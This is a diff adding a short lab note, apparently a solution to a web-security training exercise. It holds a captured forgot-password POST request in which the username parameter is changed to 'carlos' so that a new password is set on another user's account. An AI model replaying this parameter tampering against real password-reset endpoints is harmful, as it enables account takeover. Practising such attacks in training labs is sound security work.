@@ -1,0 +1,17 @@
+# Get the password reset url for your account
+
+# Modify the parameter to reset for carlos
+POST /forgot-password?temp-forgot-password-token=YgtzhU6RurUOuBSxEKsfXtVNUHvffU7p HTTP/1.1
+Host: ac861fca1e7a62028084065400fe00b3.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac861fca1e7a62028084065400fe00b3.web-security-academy.net/forgot-password?temp-forgot-password-token=YgtzhU6RurUOuBSxEKsfXtVNUHvffU7p
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 155
+Connection: close
+Cookie: session=ys29m6Mnk8cqjUVIyFzVUVWzlrTNTg8J
+Upgrade-Insecure-Requests: 1
+
+csrf=hoGte7e3Fx122VBWgQrK8HHxUc36kA5f&temp-forgot-password-token=YgtzhU6RurUOuBSxEKsfXtVNUHvffU7p&username=carlos&new-password-1=peter&new-password-2=peter
